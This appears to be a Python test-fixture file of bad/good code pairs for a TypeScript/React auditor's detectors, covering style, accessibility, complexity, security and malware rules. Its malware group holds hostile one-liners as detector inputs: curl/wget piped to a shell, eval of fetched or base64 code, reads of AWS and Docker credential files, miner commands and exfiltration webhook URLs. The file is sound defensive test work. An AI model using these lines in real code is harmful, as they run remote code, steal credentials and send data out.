"""Per-detector (rule_id, bad, good) snippets for the TS/React detectors — the TS analog of
``tests/_detector_cases.py``. ``bad`` must flag the rule; ``good`` must not.

Every rule here is objective + framework-agnostic (a11y / structure) — the auditor encodes no
design-system vocabulary, so there are no "raw markup -> specific primitive" cases."""

GROUPS: dict[str, list[tuple[str, str, str]]] = {
    "style": [
        (
            "TS-STYLE-DUPLICATE-IMPORT",
            'import { a } from "x";\nimport { b } from "x";\n',
            'import { a, b } from "x";\n',
        ),
        (
            "TS-STYLE-DUPLICATE-IMPORT",
            'import { useState } from "react";\nimport { useEffect } from "react";\n',
            'import { useState, useEffect } from "react";\n',
        ),
        (
            "TS-STYLE-DUPLICATE-IMPORT",
            'import { debounce } from "lodash";\nimport { throttle } from "lodash";\n',
            'import { debounce, throttle } from "lodash";\n',
        ),
        (
            "TS-STYLE-DUPLICATE-IMPORT",
            'import { fetchUser } from "./api";\nimport { createUser } from "./api";\n',
            'import type { User } from "./api";\nimport { fetchUser } from "./api";\n',
        ),
        (
            "TS-STYLE-DUPLICATE-IMPORT",
            'import { Grid } from "@mui/material";\nimport { Typography } from "@mui/material";\n',
            'import { Box } from "@mui/material";\nimport { Button } from "@mui/icons-material";\n',
        ),
    ],
    "react": [
        (
            "TS-REACT-MULTI-COMPONENT-FILE",
            "export function A() {\n  return <div />;\n}\nexport function B() {\n  return <span />;\n}\n",
            "export function A() {\n  return <div />;\n}\nfunction helper() {\n  return 1;\n}\n",
        ),
        (
            "TS-REACT-ARRAY-INDEX-KEY",
            "const list = <ul>{todos.map((todo, idx) => <li key={idx}>{todo.text}</li>)}</ul>;\n",
            "const list = <ul>{todos.map((todo) => <li key={todo.id}>{todo.text}</li>)}</ul>;\n",
        ),
        (
            "TS-REACT-ARRAY-INDEX-KEY",
            "const rows = items.flatMap((item, i) => [<tr key={i}><td>{item.name}</td></tr>]);\n",
            "const rows = items.flatMap((item) => [<tr key={item.uuid}><td>{item.name}</td></tr>]);\n",
        ),
        (
            "TS-REACT-EXTRACTABLE-HELPER",
            "export function PriceDisplay({ amount }: { amount: number }) {\n  const [show, setShow] = useState(true);\n  function formatCurrency(value: number) {\n    return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(value);\n  }\n  return <div>{show && formatCurrency(amount)}</div>;\n}\n",
            "export function Counter() {\n  const [count, setCount] = useState(0);\n  function increment() {\n    setCount(count + 1);\n  }\n  return <button onClick={increment}>{count}</button>;\n}\n",
        ),
        (
            "TS-REACT-EXTRACTABLE-HOOK",
            "export function DataTable({ endpoint }: { endpoint: string }) {\n  const [rows, setRows] = useState([]);\n  const [sort, setSort] = useState('asc');\n  const [filter, setFilter] = useState('');\n  const [selected, setSelected] = useState<string[]>([]);\n  const [pageSize, setPageSize] = useState(20);\n  const sorted = useMemo(() => rows, [rows, sort]);\n  useEffect(() => { fetch(endpoint).then(r => r.json()).then(setRows); }, [endpoint]);\n  return <table><tbody>{sorted.map(r => <tr key={r.id}><td>{r.name}</td></tr>)}</tbody></table>;\n}\n",
            "export function StatusBadge({ status }: { status: string }) {\n  const [hover, setHover] = useState(false);\n  const label = useMemo(() => status.toUpperCase(), [status]);\n  return <span onMouseOver={() => setHover(true)} onFocus={() => setHover(true)}>{label}</span>;\n}\n",
        ),
        (
            "TS-REACT-MULTI-COMPONENT-FILE",
            "export function PageHeader() {\n  return <header><h1>App</h1></header>;\n}\nexport function SiteFooter() {\n  return <footer><p>copyright</p></footer>;\n}\nexport function NavSidebar() {\n  return <aside><nav>menu</nav></aside>;\n}\n",
            "export function PageHeader() {\n  return <header><h1>App</h1></header>;\n}\n",
        ),
        (
            "TS-REACT-PARALLEL-SIBLING",
            "function toKilobytes(bytes: number) {\n  const result = bytes / 1024;\n  return result.toFixed(2) + ' KB';\n}\nfunction toMegabytes(bytes: number) {\n  const result = bytes / 1048576;\n  return result.toFixed(2) + ' MB';\n}\n",
            "function formatDate(d: Date) {\n  return d.toLocaleDateString('en-US', { year: 'numeric', month: 'long' });\n}\nfunction formatTime(d: Date) {\n  return d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });\n}\n",
        ),
        (
            "TS-REACT-REPEATED-JSX",
            'const nav = (\n  <nav>\n    <div><a href="/home">Home</a></div>\n    <div><a href="/about">About</a></div>\n    <div><a href="/contact">Contact</a></div>\n  </nav>\n);\n',
            'const nav = (\n  <nav>\n    <div><a href="/home">Home</a></div>\n  </nav>\n);\n',
        ),
        (
            "TS-REACT-ARRAY-INDEX-KEY",
            "const x = <ul>{items.map((it, i) => <li key={i}>{it}</li>)}</ul>;\n",
            "const x = <ul>{items.map((it) => <li key={it.id}>{it.name}</li>)}</ul>;\n",
        ),
        (
            "TS-REACT-REPEATED-JSX",
            "const x = (\n  <ul>\n    <li><a>1</a></li>\n    <li><a>2</a></li>\n    <li><a>3</a></li>\n  </ul>\n);\n",
            "const x = (\n  <ul>\n    <li><a>1</a></li>\n  </ul>\n);\n",
        ),
        (
            "TS-REACT-EXTRACTABLE-HOOK",
            "export function W() {\n  const [a, setA] = useState(0);\n  const [b, setB] = useState(0);\n  const [c, setC] = useState(0);\n  useEffect(() => setA(1), []);\n  useEffect(() => setB(2), []);\n  return <div>{a}{b}{c}</div>;\n}\n",
            "export function W() {\n  const [a, setA] = useState(0);\n  return <div>{a}</div>;\n}\n",
        ),
        (
            "TS-REACT-EXTRACTABLE-HELPER",
            "export function W({ n }: { n: number }) {\n  const [x] = useState(0);\n  function score(raw: number) {\n    const v = raw * 2;\n    return Math.round(v);\n  }\n  return <div>{score(n)}{x}</div>;\n}\n",
            "export function W() {\n  const [x, setX] = useState(0);\n  function bump() {\n    setX(x + 1);\n  }\n  return <button onClick={bump}>{x}</button>;\n}\n",
        ),
        (
            "TS-REACT-PARALLEL-SIBLING",
            "function toKib(n: number) {\n  const v = n / 1024;\n  return v.toFixed(1);\n}\nfunction toMib(n: number) {\n  const v = n / 1048576;\n  return v.toFixed(1);\n}\n",
            "function a(n: number) {\n  return n + 1;\n}\nfunction b(n: number) {\n  return n.toString();\n}\n",
        ),
        (
            "TS-REACT-ASYNC-EFFECT",
            "function W() {\n  useEffect(async () => {\n    await load();\n  }, []);\n  return <div />;\n}\n",
            "function W() {\n  useEffect(() => {\n    load();\n  }, []);\n  return <div />;\n}\n",
        ),
        (
            "TS-REACT-RANDOM-KEY",
            "const x = <ul>{items.map((it) => <li key={Math.random()}>{it}</li>)}</ul>;\n",
            "const x = <ul>{items.map((it) => <li key={it.id}>{it.name}</li>)}</ul>;\n",
        ),
        (
            "TS-REACT-EAGER-STATE-INIT",
            "function W() {\n  const [s, setS] = useState(JSON.parse(localStorage.getItem('k')));\n  return <div>{s}</div>;\n}\n",
            "function W() {\n  const [s, setS] = useState(() => JSON.parse(localStorage.getItem('k')));\n  return <div>{s}</div>;\n}\n",
        ),
    ],
    "a11y": [
        (
            "TS-A11Y-ANCHOR-NO-HREF",
            "const nav = <a onClick={() => navigate('/dashboard')}>Dashboard</a>;\n",
            'const nav = <a href="/dashboard">Dashboard</a>;\n',
        ),
        (
            "TS-A11Y-AUTOFOCUS",
            'const search = <input type="search" autoFocus placeholder="Search..." />;\n',
            'const search = <input type="search" placeholder="Search..." />;\n',
        ),
        (
            "TS-A11Y-DECORATIVE-ICON",
            "const btn = <button><DownloadIcon /> Download</button>;\n",
            'const btn = <button><DownloadIcon aria-hidden="true" /> Download</button>;\n',
        ),
        (
            "TS-A11Y-FORM-LABEL",
            'const sel = <select name="country"><option value="us">US</option></select>;\n',
            'const sel = <select name="country" aria-label="Country"><option value="us">US</option></select>;\n',
        ),
        (
            "TS-A11Y-ICON-BUTTON-NO-LABEL",
            "const del = (\n  <button onClick={handleDelete}>\n    <TrashIcon />\n  </button>\n);\n",
            'const del = (\n  <button onClick={handleDelete} aria-label="Delete item">\n    <TrashIcon />\n  </button>\n);\n',
        ),
        (
            "TS-A11Y-IFRAME-TITLE",
            'const video = <iframe src="https://www.youtube.com/embed/abc" width="560" height="315" />;\n',
            'const video = <iframe src="https://www.youtube.com/embed/abc" title="Intro video" width="560" height="315" />;\n',
        ),
        (
            "TS-A11Y-IMG-NO-ALT",
            'const img = <img src={product.imageUrl} className="product-image" />;\n',
            'const img = <img src={product.imageUrl} alt={product.name} className="product-image" />;\n',
        ),
        (
            "TS-A11Y-MOUSE-NO-KEY",
            "const tip = <div onMouseOver={showTooltip} onMouseOut={hideTooltip}>Hover me</div>;\n",
            "const tip = <div onMouseOver={showTooltip} onMouseOut={hideTooltip} onFocus={showTooltip} onBlur={hideTooltip}>Hover me</div>;\n",
        ),
        (
            "TS-A11Y-NONINTERACTIVE-ONCLICK",
            "const item = <div onClick={() => router.push('/profile')}>Profile</div>;\n",
            "const item = <button onClick={() => router.push('/profile')}>Profile</button>;\n",
        ),
        (
            "TS-A11Y-POSITIVE-TABINDEX",
            "const heading = <h2 tabIndex={2}>Modal Title</h2>;\n",
            "const heading = <h2 tabIndex={0}>Modal Title</h2>;\n",
        ),
        (
            "TS-A11Y-REDUNDANT-ROLE",
            'const sidebar = <nav role="navigation"><ul><li>Home</li></ul></nav>;\n',
            "const sidebar = <nav><ul><li>Home</li></ul></nav>;\n",
        ),
        (
            "TS-A11Y-NONINTERACTIVE-ONCLICK",
            "const x = <div onClick={go}>label</div>;\n",
            'const x = (\n  <div role="button" tabIndex={0} onClick={go} onKeyDown={k}>\n    label\n  </div>\n);\n',
        ),
        (
            "TS-A11Y-ICON-BUTTON-NO-LABEL",
            "const x = (\n  <Button>\n    <CloseIcon />\n  </Button>\n);\n",
            'const x = (\n  <Button aria-label="close">\n    <CloseIcon />\n  </Button>\n);\n',
        ),
        (
            "TS-A11Y-IMG-NO-ALT",
            'const x = <img src="logo.png" />;\n',
            'const x = <img src="logo.png" alt="logo" />;\n',
        ),
        (
            "TS-A11Y-POSITIVE-TABINDEX",
            "const x = <div tabIndex={3}>x</div>;\n",
            "const x = <div tabIndex={0}>x</div>;\n",
        ),
        (
            "TS-A11Y-FORM-LABEL",
            'const x = <input type="text" />;\n',
            'const x = <input type="text" aria-label="name" />;\n',
        ),
        (
            "TS-A11Y-ANCHOR-NO-HREF",
            "const x = <a onClick={go}>x</a>;\n",
            'const x = <a href="/x">x</a>;\n',
        ),
        (
            "TS-A11Y-AUTOFOCUS",
            "const x = <div autoFocus tabIndex={0}>x</div>;\n",
            "const x = <div tabIndex={0}>x</div>;\n",
        ),
        (
            "TS-A11Y-REDUNDANT-ROLE",
            'const x = <button role="button">go</button>;\n',
            "const x = <button>go</button>;\n",
        ),
        (
            "TS-A11Y-MOUSE-NO-KEY",
            "const x = <div onMouseOver={f}>x</div>;\n",
            "const x = <div onMouseOver={f} onFocus={g}>x</div>;\n",
        ),
        (
            "TS-A11Y-IFRAME-TITLE",
            'const x = <iframe src="/x" />;\n',
            'const x = <iframe src="/x" title="map" />;\n',
        ),
        (
            "TS-A11Y-DECORATIVE-ICON",
            "const x = <button><PlusIcon /> Save</button>;\n",
            'const x = <button><PlusIcon aria-hidden="true" /> Save</button>;\n',
        ),
    ],
    "security": [
        (
            "TS-SEC-DANGEROUS-EVAL",
            "const result = eval(userInput);\n",
            "const result = JSON.parse(userInput);\n",
        ),
        (
            "TS-SEC-DANGEROUS-EVAL",
            'const fn = new Function("return " + expr);\n',
            "const compute = (a: number, b: number): number => a + b;\n",
        ),
        (  # setTimeout/setInterval with a string arg is an eval-equivalent sink; a function arg is safe
            "TS-SEC-DANGEROUS-EVAL",
            'setTimeout("doStuff()", 1000);\n',
            "setTimeout(() => doStuff(), 1000);\n",
        ),
        (
            "TS-SEC-DANGEROUS-EVAL",
            'setInterval("poll()", 5000);\n',
            "setInterval(poll, 5000);\n",
        ),
        (
            "TS-SEC-DANGEROUS-HTML",
            "const x = <div dangerouslySetInnerHTML={{ __html: content }} />;\n",
            'const x = <div dangerouslySetInnerHTML={{ __html: "<p>Static</p>" }} />;\n',
        ),
        (
            "TS-SEC-DANGEROUS-HTML",
            "const x = <article dangerouslySetInnerHTML={{ __html: post.body }} />;\n",
            "const x = <div>{children}</div>;\n",
        ),
        (
            "TS-SEC-JAVASCRIPT-URL",
            'const x = <a href="javascript:void(0)" onClick={go}>click</a>;\n',
            'const x = <a href="#" onClick={go}>click</a>;\n',
        ),
        (
            "TS-SEC-JAVASCRIPT-URL",
            'const x = <a href="javascript:doSomething()">link</a>;\n',
            'const x = <a href="https://example.com">link</a>;\n',
        ),
        (
            "TS-SEC-TARGET-BLANK-NOOPENER",
            'const x = <a href="https://example.com" target="_blank">visit</a>;\n',
            'const x = <a href="https://example.com" target="_blank" rel="noopener noreferrer">visit</a>;\n',
        ),
        (
            "TS-SEC-TARGET-BLANK-NOOPENER",
            'const x = <Link href={docsUrl} target="_blank">Docs</Link>;\n',
            'const x = <Link href={docsUrl} target="_blank" rel="noreferrer">Docs</Link>;\n',
        ),
        (
            "TS-SEC-DANGEROUS-HTML",
            "const x = <div dangerouslySetInnerHTML={{ __html: userHtml }} />;\n",
            'const x = <div dangerouslySetInnerHTML={{ __html: "<b>safe</b>" }} />;\n',
        ),
        (
            "TS-SEC-TARGET-BLANK-NOOPENER",
            'const x = <a href="/x" target="_blank">go</a>;\n',
            'const x = <a href="/x" target="_blank" rel="noopener">go</a>;\n',
        ),
        (
            "TS-SEC-JAVASCRIPT-URL",
            'const x = <a href="javascript:alert(1)">go</a>;\n',
            'const x = <a href="/safe">go</a>;\n',
        ),
        (
            "TS-SEC-DANGEROUS-EVAL",
            "const x = eval(code);\n",
            "const x = JSON.parse(code);\n",
        ),
    ],
    "complexity": [
        (
            "TS-STYLE-FILE-SIZE",
            "const x = 1;\n" * 802,
            "const x = 1;\n" * 50,
        ),
        (
            "TS-STYLE-FILE-SIZE",
            "// big module\n" + "const line = 0;\n" * 815,
            "// small module\n" + "const line = 0;\n" * 10,
        ),
        (
            "TS-REACT-TOO-MANY-PROPS",
            "export function Card({ title, subtitle, image, href, onClick, onHover, isDisabled, variant }: CardProps) {\n  return <div />;\n}\n",
            "export function Card({ title, subtitle, href }: CardProps) {\n  return <div />;\n}\n",
        ),
        (
            "TS-REACT-TOO-MANY-PROPS",
            "export function Table({ data, columns, onSort, onFilter, pageSize, page, onPageChange, loading, emptyText }: TableProps) {\n  return <table />;\n}\n",
            "export function Table({ data, columns, loading }: TableProps) {\n  return <table />;\n}\n",
        ),
        (
            "TS-REACT-DEEP-JSX-NESTING",
            "const x = (\n  <section><div><main><article><div><p><span>deep</span></p></div></article></main></div></section>\n);\n",
            "const x = (\n  <section><div><p>shallow</p></div></section>\n);\n",
        ),
        (
            "TS-REACT-DEEP-JSX-NESTING",
            "const x = (\n  <div><div><div><div><div><div><div><span>way deep</span></div></div></div></div></div></div></div>\n);\n",
            "const x = (\n  <div><div><span>fine</span></div></div>\n);\n",
        ),
        (
            "TS-STYLE-FILE-SIZE",
            "const x = 1;\n" * 801,
            "const x = 1;\n",
        ),
        (
            "TS-REACT-TOO-MANY-PROPS",
            "export function W({ a, b, c, d, e, f, g }: Props) {\n  return <div />;\n}\n",
            "export function W({ a }: Props) {\n  return <div />;\n}\n",
        ),
        (
            "TS-REACT-DEEP-JSX-NESTING",
            "const x = (\n  <div><div><div><div><div><div><div>deep</div></div></div></div></div></div></div>\n);\n",
            "const x = (\n  <div><div>shallow</div></div>\n);\n",
        ),
    ],
    "malware": [
        (
            "TS-MAL-OBFUSCATED-EXEC",
            'const run = new Function(atob("aGVsbG8="));\nrun();\n',
            'const cfg = JSON.parse(atob("eyJlbnYiOiJwcm9kIn0="));\n',
        ),
        (
            "TS-MAL-OBFUSCATED-EXEC",
            'eval(Buffer.from(encoded, "base64").toString());\n',
            'const decoded = Buffer.from(encoded, "base64").toString("utf8");\nconsole.log(decoded);\n',
        ),
        (
            "TS-MAL-REMOTE-EXEC",
            'eval(await (await fetch("https://config.example.invalid/plugin.js")).text());\n',
            'const cfg = await (await fetch("https://api.example.com/config.json")).json();\n',
        ),
        (
            "TS-MAL-REMOTE-EXEC",
            'new Function(await fetch("https://update.example.invalid/patch.js").then(r=>r.text()))();\n',
            'document.querySelector("#preview").textContent = await fetch("https://cdn.example.com/snippet.js").then(r=>r.text());\n',
        ),
        (
            "TS-MAL-DOWNLOAD-EXEC",
            'execSync("wget -qO- https://setup.example.invalid/install.sh | bash");\n',
            'execSync("wget -O /tmp/install.sh https://setup.example.invalid/install.sh");\n',
        ),
        (
            "TS-MAL-DYNAMIC-REQUIRE",
            "const plugin = require(pluginName);\n",
            'const plugin = require("./plugins/default");\n',
        ),
        (
            "TS-MAL-DYNAMIC-REQUIRE",
            'const lib = require(env.ADAPTER || "default");\n',
            'const lib = require("./adapters/default");\n',
        ),
        (
            "TS-MAL-CRYPTO-MINER",
            'const MINER_CMD = "/usr/local/bin/xmrig --config /etc/xmrig.json";\n',
            'const SERVER_CMD = "/usr/local/bin/node server.js";\n',
        ),
        (
            "TS-MAL-CRYPTO-MINER",
            'const POOL_URL = "stratum+ssl://daggerhashimoto.eu.nicehash.com:33353";\n',
            'const API_URL = "https://api.example.com/v1/metrics";\n',
        ),
        (
            "TS-MAL-CREDENTIAL-ACCESS",
            'const awsCreds = readFileSync("/home/ubuntu/.aws/credentials", "utf8");\n',
            'const appConfig = readFileSync("./config/settings.yaml", "utf8");\n',
        ),
        (
            "TS-MAL-CREDENTIAL-ACCESS",
            'const dockerCreds = JSON.parse(readFileSync("/root/.docker/config.json", "utf8"));\n',
            'const appConfig = JSON.parse(readFileSync("./config/app.json", "utf8"));\n',
        ),
        (
            "TS-MAL-ENCODED-BLOB",
            f'const payload = "{"A" * 250}";\n',
            'const csrfToken = "abc123-def456-ghi789";\n',
        ),
        (
            "TS-MAL-EXEC-INJECTION",
            "const result = execSync(`git log --oneline ${branch}`);\n",
            'const result = execSync("git log --oneline HEAD");\n',
        ),
        (
            "TS-MAL-EXEC-INJECTION",
            "exec(userCommand, (err, stdout) => { res.send(stdout); });\n",
            'exec("git status", (err, stdout) => { res.send(stdout); });\n',
        ),
        (
            "TS-MAL-EXFIL-URL",
            'const CALLBACK_URL = "https://abc123.ngrok.io/collect";\n',
            'const API_BASE = "https://api.myservice.com/v2";\n',
        ),
        (
            "TS-MAL-EXFIL-URL",
            'const ALERT_HOOK = "https://discord.com/api/webhooks/123456789/abcdefghijklmnopqrstuvwxyz";\n',
            'const DISCORD_API = "https://discord.com/api/v10/channels/123456789/messages";\n',
        ),
        (
            "TS-MAL-OBFUSCATED-EXEC",
            "eval(atob(payload));\n",
            "const decoded = atob(payload);\n",  # decode, no eval
        ),
        (
            "TS-MAL-REMOTE-EXEC",
            "async function f(u) {\n  eval(await fetch(u).then((r) => r.text()));\n}\n",
            "async function f(u) {\n  const body = await fetch(u).then((r) => r.text());\n}\n",
        ),
        (
            "TS-MAL-DOWNLOAD-EXEC",
            'execSync("curl http://example.invalid/x.sh | sh");\n',
            'execSync("curl -o out http://example.invalid/x.sh");\n',  # download, not piped to a shell
        ),
        (
            "TS-MAL-DYNAMIC-REQUIRE",
            "const mod = require(name);\n",
            'const mod = require("fs");\n',  # static literal path
        ),
        (
            "TS-MAL-CRYPTO-MINER",
            'const pool = "stratum+tcp://pool.example.invalid:4444";\n',
            'const url = "https://api.example.com/v1";\n',
        ),
        (
            "TS-MAL-CREDENTIAL-ACCESS",
            'const p = readFileSync("/home/u/.aws/credentials");\n',
            'const p = readFileSync("/home/u/project/config.yaml");\n',
        ),
        (
            "TS-MAL-ENCODED-BLOB",
            f'const blob = "{"A" * 240}";\n',
            'const token = "short-normal-string";\n',
        ),
        (
            "TS-MAL-EXEC-INJECTION",
            "execSync(`tar -czf /tmp/a.tgz ${dir}`);\n",  # command built from interpolation
            'execSync("tar -czf /tmp/a.tgz ./src");\n',  # a fixed, literal command
        ),
        (
            "TS-MAL-EXFIL-URL",
            'const sink = "https://webhook.site/00000000-0000-0000-0000-000000000000";\n',
            'const url = "https://api.example.com/v1/events";\n',  # a normal service URL
        ),
    ],
}
